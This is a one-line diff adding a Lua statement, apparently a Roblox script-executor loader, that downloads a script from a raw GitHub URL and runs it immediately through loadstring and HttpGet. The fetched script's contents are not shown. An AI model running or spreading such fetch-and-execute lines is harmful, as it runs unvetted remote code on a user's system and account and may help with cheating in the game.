@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ZORO-PING/Good/refs/heads/main/Script"))()
